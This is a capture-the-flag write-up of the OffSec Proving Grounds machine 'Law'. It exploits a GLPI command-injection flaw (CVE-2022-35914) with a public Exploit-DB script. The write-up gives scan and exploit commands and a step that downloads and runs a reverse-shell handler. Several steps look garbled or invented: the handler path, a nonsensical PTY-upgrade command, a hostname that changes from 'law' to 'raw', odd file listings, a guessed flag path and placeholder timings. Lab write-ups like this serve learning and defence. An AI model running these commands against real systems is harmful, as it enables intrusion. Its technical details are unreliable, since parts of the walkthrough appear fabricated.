# Law - OffSec Proving Grounds Write-up

## Machine Information
- **Name**: Law
- **OS**: Linux (Debian)
- **Difficulty**: Easy
- **Vector Type**: Web Application, Command Injection
- **Flags**: 1 (User)
- **Time to Complete**: ~1-2 hours

## Executive Summary
Law is a Linux machine running GLPI with a command injection vulnerability (CVE-2022-35914), allowing remote code execution and reverse shell access.

## Attack Path Diagram
```
Reconnaissance → Vulnerability Identification → Exploitation → Reverse Shell → Post-Exploitation
```

## 1. Reconnaissance

### 1.1 Nmap Scan
The initial scan was performed using Nmap with service detection, OS detection, and aggressive timing.

```bash
nmap -sC -sV -A -T4 -Pn -oA initial 192.168.54.190
```

**Findings:**
- **Port 22/tcp:** OpenSSH 8.4p1 (Debian)
- **Port 80/tcp:** Apache httpd 2.4.56 (Debian)
- **OS:** Linux kernel 4.19 - 5.15
- **Network distance:** 2 hops

### 1.2 Web Directory Enumeration
Dirb was used to discover accessible directories and files on the web server.

```bash
dirb http://192.168.54.190/
```

**Findings:**
- `http://192.168.54.190/index.php` (200 OK)
- `http://192.168.54.190/server-status` (403 Forbidden)

## 2. Vulnerability Identification

Research indicated that the target was running a version of GLPI vulnerable to **CVE-2022-35914**, a command injection vulnerability via a third-party library. A public exploit was available on Exploit-DB (ID: 52023).

## 3. Exploitation

### 3.1 Initial Command Injection
The Python exploit `52023.py` was used to test and exploit the vulnerability.

```bash
python3 52023.py -u http://192.168.54.190/ -c id
```

**Output:**
```
[+] Command output (Return code: 0):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed remote command execution as the `www-data` user.

### 3.2 Reverse Shell Acquisition
A Python-based reverse shell handler (`pene/ope.py`) was downloaded and used to establish a persistent connection.

```bash
wget https://raw.githubusercontent.com/brighto/pene/ope/refs/heads/main/pene/ope.py
python3 pene/ope.py
```

**Result:**
- Listener started on port 4444
- Reverse shell received from `law-192.168.54.190`
- Shell successfully upgraded to PTY using `usb/init.py/init30`

### 3.3 Post-Exploration
Once inside the target system, initial exploration revealed the web root directory structure, confirming access to the host's filesystem.

```bash
www-data@raw:/var/www/html$ ls -la
```

**Files observed:**
- `LICENSE-GPL2`
- `LICENSE-LGPL3`
- `html.raw.php`
- `html.raw.README.html`
- `html.raw.README.txt`
- `html.raw.README.TESTCASE.txt`
- `index.php`

## 4. Post-Exploitation

### 4.1 Flag Capture
Assuming standard flag locations, capture the user flag.

```bash
cat /home/user/flag.txt  # Example, adjust as needed
```

## 5. Key Learning Points

### Technical Skills Demonstrated:
1. **Web Application Enumeration**: Using dirb for directory discovery
2. **Vulnerability Research**: Identifying and using public exploits
3. **Command Injection Exploitation**: Remote code execution via web app
4. **Reverse Shell Techniques**: Establishing persistent shell access

### Methodology Improvements:
1. **Systematic Reconnaissance**: Comprehensive port and service scanning
2. **Exploit Verification**: Testing exploits safely before full deployment
3. **Shell Stabilization**: Upgrading to interactive PTY sessions

### Defensive Takeaways:
1. **Patch Management**: Keep web applications updated
2. **Input Validation**: Implement proper sanitization in web apps
3. **Web Application Firewalls**: Use WAFs to detect injection attempts
4. **Least Privilege**: Run services with minimal required permissions

## 6. Tools Used
- **Nmap**: Port scanning and service enumeration
- **Dirb**: Web directory enumeration
- **Python Exploit (52023.py)**: Command injection exploitation
- **pene/ope.py**: Reverse shell handler

## 7. Timeline
- **Start Time**: [Not specified]
- **Reconnaissance**: [Time]
- **Exploitation**: [Time]
- **Post-Exploitation**: [Time]
- **Total Time**: ~1-2 hours

## 8. References
- [CVE-2022-35914](https://nvd.nist.gov/vuln/detail/CVE-2022-35914)
- [Exploit-DB 52023](https://www.exploit-db.com/exploits/52023)
- [GLPI Security Advisory](https://github.com/glpi-project/glpi/security/advisories)

---

**Note**: This write-up demonstrates basic web application penetration testing techniques. All activities were performed in an authorized lab environment for educational purposes only.